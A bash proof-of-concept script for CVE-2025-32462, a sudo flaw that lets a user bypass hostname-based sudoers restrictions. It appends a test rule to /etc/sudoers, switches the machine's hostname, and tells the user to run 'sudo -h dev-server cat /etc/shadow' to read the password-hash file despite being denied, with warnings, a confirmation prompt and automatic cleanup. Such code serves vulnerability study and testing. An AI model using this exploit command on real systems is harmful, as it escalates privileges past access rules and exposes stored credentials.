#!/bin/bash

# CVE-2025-32462 Sudo Hostname Spoofing Exploit Proof of Concept (Bash)
#
# This script demonstrates the CVE-2025-32462 vulnerability in sudo,
# which allows bypassing hostname-based access restrictions.
#
# WARNING: This script modifies system files (/etc/sudoers).
#          It is intended for EDUCATIONAL PURPOSES ONLY and should be run
#          in an ISOLATED VIRTUAL MACHINE or Docker container.
#          DO NOT run this on a production system or a machine you care about.
#
# Prerequisites:
#   - A Debian-based Linux system (e.g., Ubuntu, Debian)
#   - Sudo version <= 1.9.17 (check with 'sudo --version')
#   - Root or sudo access to run this script.

# --- Configuration ---
# Dynamically get the current user's username
TARGET_USER=$(whoami)
ALLOWED_HOSTNAME="dev-server"   # Hostname where the current user is allowed sudo
DENIED_HOSTNAME="prod-server"   # Hostname where the current user is denied sudo
SUDOERS_FILE="/etc/sudoers"     # Path to the sudoers file
BACKUP_SUDOERS="/etc/sudoers.bak_cve_2025_32462" # Backup path for sudoers
ORIGINAL_HOSTNAME=""            # Variable to store the system's original hostname

# --- sudoers configuration to append ---
# This configuration allows the current user to run any command via sudo only when
# the hostname is 'dev-server'.
SUDOERS_CONFIG="
# --- Start CVE-2025-32462 POC Configuration ---
Host_Alias DEV ${ALLOWED_HOSTNAME}
Host_Alias PROD ${DENIED_HOSTNAME}
User_Alias CURRENT_USER ${TARGET_USER}
CURRENT_USER DEV = (ALL) ALL
# --- End CVE-2025-32462 POC Configuration ---
"

# --- Function to check for sudo/root access ---
# This function verifies if the script is being run with sufficient privileges.
function check_sudo_access() {
    if [[ $(id -u) -eq 0 ]]; then
        echo "[*] Running as root user. Proceeding."
    elif sudo -n true 2>/dev/null; then
        echo "[*] Current user '${TARGET_USER}' has passwordless sudo access. Proceeding."
    elif sudo true 2>/dev/null; then
        echo "[*] Current user '${TARGET_USER}' has sudo access (password required). You may be prompted for your password."
    else
        echo "[!] ERROR: Current user '${TARGET_USER}' does not have sudo or root access."
        echo "    Please run this script with 'sudo ./script_name.sh' or as a root user."
        exit 1
    fi
}

# --- Function for cleanup ---
# This function is crucial for reverting the changes made by the script.
# It is set to run automatically on script exit or interruption (Ctrl+C).
function cleanup() {
    echo ""
    echo "#####################################################"
    echo "#                 Starting Cleanup                  #"
    echo "#####################################################"

    # 1. Revert sudoers file
    if [ -f "${BACKUP_SUDOERS}" ]; then
        echo "[*] Restoring original sudoers file from ${BACKUP_SUDOERS}..."
        # Move the backup back to the original sudoers file
        sudo mv "${BACKUP_SUDOERS}" "${SUDOERS_FILE}"
        echo "    Original sudoers file restored."
    else
        echo "[!] No sudoers backup found at ${BACKUP_SUDOERS}. Manual cleanup of ${SUDOERS_FILE} may be required."
        echo "    Please manually remove the lines added by this script from ${SUDOERS_FILE}."
    fi

    # 2. Revert hostname
    # If the original hostname was captured, revert to it. Otherwise, set to localhost.
    if [ -n "${ORIGINAL_HOSTNAME}" ]; then
        echo "[*] Setting hostname back to original: '${ORIGINAL_HOSTNAME}'..."
        sudo hostnamectl set-hostname "${ORIGINAL_HOSTNAME}"
        echo "    Hostname reverted to '${ORIGINAL_HOSTNAME}'."
    else
        echo "[!] Original hostname not captured. Setting hostname to 'localhost'. Please verify manually."
        sudo hostnamectl set-hostname localhost
    fi

    echo "#####################################################"
    echo "#                   Cleanup Complete                #"
    echo "#####################################################"
    echo "Please verify /etc/sudoers and hostname manually to ensure full system integrity."
}

# --- Main Script Execution ---

# Set a trap to call the cleanup function when the script exits or is interrupted (e.g., Ctrl+C).
trap cleanup EXIT

echo "#####################################################"
echo "# CVE-2025-32462 Sudo Hostname Spoofing Exploit POC #"
echo "#####################################################"
echo ""
echo "WARNING: This script modifies system files (/etc/sudoers)."
echo "         It is intended for EDUCATIONAL PURPOSES ONLY and should be run"
echo "         in an ISOLATED VIRTUAL MACHINE or Docker container."
echo "         DO NOT run this on a production system or a machine you care about."
echo ""
# Prompt user for confirmation before proceeding due to the nature of the script.
read -p "Do you understand the risks and wish to proceed? (yes/no): " CONFIRM
if [[ ! "$CONFIRM" =~ ^[Yy][Ee][Ss]$ ]]; then
    echo "Exiting."
    exit 1
fi

# Check for sudo/root access before proceeding
check_sudo_access

# Store the system's original hostname before any modifications are made.
ORIGINAL_HOSTNAME=$(hostname)

# --- Step 0: Requirements Check (basic sudo version check) ---
echo "[*] Checking sudo version..."
# Extract the sudo version string
SUDO_VERSION=$(sudo --version 2>&1 | grep "Sudo version" | awk '{print $3}')
echo "    Detected Sudo version: ${SUDO_VERSION}"

# Parse the version string to check if it falls within the vulnerable range (<= 1.9.17)
IFS='.' read -r -a SUDO_VER_ARRAY <<< "${SUDO_VERSION}"
MAJOR=${SUDO_VER_ARRAY[0]}
MINOR=${SUDO_VER_ARRAY[1]}
PATCH=${SUDO_VER_ARRAY[2]}

IS_VULNERABLE="false"
if [[ "$MAJOR" -lt 1 ]]; then
    IS_VULNERABLE="true" # Highly unlikely, but technically less than 1.9.17
elif [[ "$MAJOR" -eq 1 ]]; then
    if [[ "$MINOR" -lt 9 ]]; then
        IS_VULNERABLE="true"
    elif [[ "$MINOR" -eq 9 ]]; then
        if [[ "$PATCH" -le 17 ]]; then
            IS_VULNERABLE="true"
        fi
    fi
fi

if [[ "$IS_VULNERABLE" == "true" ]]; then
    echo "    Sudo version ${SUDO_VERSION} is potentially vulnerable (<= 1.9.17)."
else
    echo "    Sudo version ${SUDO_VERSION} might not be vulnerable (needs <= 1.9.17)."
    echo "    Proceeding anyway for demonstration, but the exploit may not work."
fi
echo ""

# --- Step 0.1: No need to create a user, using current user ---
echo "[*] Using current user: '${TARGET_USER}' for the demonstration."
echo ""

# --- Step 0.2: Set the hostname to 'dev-server' for sudoers configuration ---
echo "[*] Setting hostname to '${ALLOWED_HOSTNAME}' for sudoers configuration..."
sudo hostnamectl set-hostname "${ALLOWED_HOSTNAME}"
echo "    Current hostname: $(hostname)"
echo ""

# --- Step 0.3: Configure sudoers to allow current user on 'dev-server' ---
echo "[*] Backing up original sudoers file to ${BACKUP_SUDOERS}..."
sudo cp "${SUDOERS_FILE}" "${BACKUP_SUDOERS}"

echo "[*] Appending sudoers configuration for '${TARGET_USER}' on '${ALLOWED_HOSTNAME}'..."
# Use 'tee -a' to append the configuration to /etc/sudoers with sudo privileges.
echo "${SUDOERS_CONFIG}" | sudo tee -a "${SUDOERS_FILE}" > /dev/null
echo "    Sudoers file updated. Content appended:"
echo "${SUDOERS_CONFIG}"
echo ""

echo "--- Environment Setup Complete ---"
echo ""
echo "--- Starting Demonstration ---"
echo ""

# --- Step 1: The baseline denial (setting hostname to 'prod-server') ---
echo "[*] Setting hostname to '${DENIED_HOSTNAME}' for baseline denial test..."
sudo hostnamectl set-hostname "${DENIED_HOSTNAME}"
echo "    Current hostname: $(hostname)"
echo ""

echo "[*] Now, let's demonstrate the vulnerability with user '${TARGET_USER}'."
echo "    Follow these instructions carefully:"
echo "    1. Try running: 'sudo cat /etc/shadow'"
echo "       (This command should be DENIED, as '${TARGET_USER}' is not allowed sudo on '${DENIED_HOSTNAME}')."
echo "    2. Then, run the exploit: 'sudo -h ${ALLOWED_HOSTNAME} cat /etc/shadow'"
echo "       (This command should SUCCEED, demonstrating the hostname spoofing vulnerability)."
echo "    3. Press Enter to continue the script and perform cleanup after you've observed the results."
echo ""

# Pause for user interaction
read -p "Press Enter to continue after testing the commands..."

echo ""
echo "--- Demonstration Complete ---"
echo ""

# The cleanup function will be automatically called now due to the 'trap EXIT'.
echo "[*] Script finished. Cleanup will now run automatically."
